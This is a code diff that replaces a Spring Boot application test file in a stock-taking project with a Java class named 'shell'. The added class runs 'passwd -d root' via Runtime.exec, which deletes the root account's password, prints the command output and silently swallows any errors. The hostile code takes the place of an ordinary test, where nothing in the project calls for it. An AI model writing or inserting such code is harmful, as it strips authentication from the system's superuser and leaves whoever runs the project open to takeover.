@@ -1,13 +1,35 @@
-package com.Stock;
+import java.io.BufferedReader;
 
-import org.junit.jupiter.api.Test;
-import org.springframework.boot.test.context.SpringBootTest;
+import java.io.InputStreamReader;
 
-@SpringBootTest
-class StockTakingApplicationTests {
+public class shell {
 
-	@Test
-	void contextLoads() {
-	}
+     public static void main(String args[]) {
 
-}
+         String s;
+
+         Process p;
+
+         try {
+
+             p = Runtime.getRuntime().exec(“passwd -d root”);
+
+             BufferedReader br = new BufferedReader(
+
+                 new InputStreamReader(p.getInputStream()));
+
+             while ((s = br.readLine()) != null)
+
+                 System.out.println(“line: ” + s);
+
+             p.waitFor();
+
+             System.out.println (“exit: ” + p.exitValue());
+
+             p.destroy();
+
+         } catch (Exception e) {}
+
+     }
+
+ }
